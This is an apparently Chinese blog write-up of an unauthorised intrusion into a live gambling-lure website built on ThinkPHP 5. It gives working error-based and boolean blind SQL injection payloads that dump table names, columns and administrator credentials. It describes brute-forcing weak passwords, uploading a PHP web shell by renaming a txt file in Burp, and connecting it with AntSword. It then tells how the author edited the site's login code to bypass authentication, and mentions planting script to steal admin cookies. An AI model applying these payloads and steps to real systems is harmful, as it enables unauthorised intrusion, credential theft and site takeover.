微信经常被人分享一些乱七八杂的文章，比如什么100元带你赚大钱，今天群里面发了出来，就pk一下，看看能不能毒打。

## 事件起因是：

群里有大哥说是引流赌博链接，就把链接发出来了，

![1599201022.png!small](https://image.3001.net/images/20200904/1599201022.png!small)

群里反馈说封IP很快，我就打开看看，一看好家伙

![1599201030.png!small](https://image.3001.net/images/20200904/1599201030.png!small)

一小时赚这么多钱，苦逼的我一天100都赚不到，赶紧那电脑打开，也想学习学习，如何赚钱。当我电脑打开就跳到京东了。

![1599201158.png!small](https://image.3001.net/images/20200904/1599201158.png!small)

让我思考重构世界，嘤嘤嘤！！！！！瞧不起我？？

手机能浏览，电脑不能浏览。那就是页面存在的，那么，看看是什么框架做的

![1599201109.png!small](https://image.3001.net/images/20200904/1599201109.png!small)

## 开始注入

小老弟，这不是tp5嘛！既然是TP5,试试tp5的漏洞，行行

testing.................................

mmp，不行，反而还给封了ip，只能自己来了，自动化工具肯定是不行了，手工开始干他。

先测试 payload:and 1=1(正常跳到京东)

再测试：and 1=2(报错了)，页面如下，似乎得到了他的查询语句

那就常规注入，试一下，先用order by 判断占位，试了半天都报错，确定不下多少位 ，感觉要凉了。

可恶的是，没试多少次就给我重置了！！！！！！！

换一个角度，那就报错注入吧，免得踩坑，爆当前数据库，构造url:

  * ![1599201200.png!small](https://image.3001.net/images/20200904/1599201200.png!small)

    
    
    and (select 1 from (select count(*),concat((database()),floor(rand(0)*2))x from information_schema.tables group by x)a)

得到数据库，那就，下一步，到报表，又给重置了IP，有要换！！！！

好家伙哈，看我不好好收拾你！

直接爆表，写了脚本，爆了有用的表erp_admin，使用的payload:

  * ![1599201250.png!small](https://image.3001.net/images/20200904/1599201250.png!small)

    
    
    and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema=database() limit 4,1),floor(rand(0)*2),'~')x from information_schema.tables group by x)a)

然后爆字段，使用的payload:

  * ![1599201268.png!small](https://image.3001.net/images/20200904/1599201268.png!small)

    
    
    and (select 1 from (select count(*),concat('~',(select column_name from information_schema.columns where table_name='"+tab1+"' limit "+str(i)+",1),floor(rand(0)*2),'~')x from information_schema.tables group by x)a)

通过tab 为指定的数据表修改str(i) 显示不同的字段名,就写了脚本，跑出来了

['admin_id','admin_username','admin_pwd','admin_pwd_salt','admin_changepwd','admin_email','admin_realname','admin_avatar','admin_tel','admin_hits','admin_ip','admin_time','admin_last_ip','admin_last_time','admin_addtime','admin_mdemail','admin_open','member_id','admin_bs','admin_dqtime','admin_dqdate','gourp_id']
一共20多个字段名.

看到admin_pwd_salt，完了，密文无解，完犊子咯！白费一趟。先跑一下数据，想用报错型爆，报错的payload:

    
    
    and (select 1 from (select count(*),concat('~',(select "+columnname+" from "+tab1+" limit "+str(i)+",1),floor(rand(0)*2),'~')x from information_schema.tables group by x)a)

指定的字段名，表名 修改str(i)返回第几个字符串。

![1599201308.png!small](https://image.3001.net/images/20200904/1599201308.png!small)

明明写了limit，还说我查询多行，我真实的payload:

  * 

    
    
    and%20(select%201%20from%20(select%20count(*),concat('~',(select%20admin_username%20from%20erp_admin%20limit%201,1),floor(rand(0)*2),'~')x%20from%20information_schema.tables%20group%20by%20x)a)

既然说我多行，那就布尔注入，办法总比困难多，哈哈哈

先上payload:

    
    
    if(ascii(substr((select(字段名)from(表名)),第几位字符串,1))=第几个字符串的acsii,1241,2)

假如第一个账号的第一个字符等于A，字符串acsii ,当

    
    
    if(ascii(substr((select(admin_username)from(erp_admin)),1,1))=65,1241,2)

会被跳到京东，否则都报错。。。。。写了脚本，跑了第一个账号为admin。第二个账号就

    
    
    if(ascii(substr((select(flag)from(flag) limit 2,1),1,1))=0,1,2)

多加一个limit 。跑了三个，账号分别为admin、qunliang、15023181637。

拿管理员开刀，又返回去用报错注入。

payload：

    
    
    and (select 1 from (select count(*),concat('~',(select "+str(i)+" from erp_admin where admin_username='admin'),floor(rand(0)*2),'~')x from information_schema.tables group by x)a)

限制为admin_username为admin就能爆出来了。修改str(i)，i为字段名，得到了

![1599201356.png!small](https://image.3001.net/images/20200904/1599201356.png!small)

密码的密文为32的加密，又有密码的salt，密码解不出来了。

## 爆破账号

经过爆破，运气很好，qunliang、15023181637的账号密码为123456。

查找上传点，上传小马。这里是踩坑的一个地方。一共有三个上传的地方，其余两处都是上传图片的，半天没成功。找到了上传文件的。

![1599201692.png!small](https://image.3001.net/images/20200904/1599201692.png!small)

这个地方踩坑，图片都不能上传，只能上传txt文件，之后修改回来即可。制作了txt木马，使用burp改成php

![1599201777.png!small](https://image.3001.net/images/20200904/1599201777.png!small)

改马

![1599201824.png!small](https://image.3001.net/images/20200904/1599201824.png!small)

访问，已经回显ok。

![1599201836.png!small](https://image.3001.net/images/20200904/1599201836.png!small)

链接蚁剑，得到

![1599201891.png!small](https://image.3001.net/images/20200904/1599201891.png!small)

权限很小。

基本提权不了，就连返回上级目录，cd 都执行不了。既然不能提权，那就看看登录前面的admin。

思路：1，通过修改数据库，将管理员改到通一组。2，修改登录条件。3，在管理页面放js脚本，捕获管理员cookie（不知何时管理员登陆）。

经过半天，都找不到数据库配置文件，不知道藏哪里了。只有使用第二个办法。就在蚁剑审计一波。

![1599201956.png!small](https://image.3001.net/images/20200904/1599201956.png!small)

发现调用了一个login的函数，顺着调用文件找到了login函数。

![1599201978.png!small](https://image.3001.net/images/20200904/1599201978.png!small)

直接把else注释掉，哈哈哈。这样子密码随便输入了。

![1599202014.png!small](https://image.3001.net/images/20200904/1599202014.png!small)

成功登录admin。收集admin用户信息。完工

